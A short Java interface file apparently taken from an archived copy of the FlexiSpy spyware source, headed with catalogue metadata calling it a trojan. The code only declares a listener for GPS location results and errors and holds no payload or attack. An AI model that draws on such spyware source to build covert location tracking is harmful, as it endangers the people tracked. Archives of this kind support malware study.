/*
  name      FlexiSpy
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
package com.vvt.gpsc.gloc;

public interface GLocationListener {
	public void notifyGLocation(GLocResponse resp);
	public void notifyError(Exception e);
}
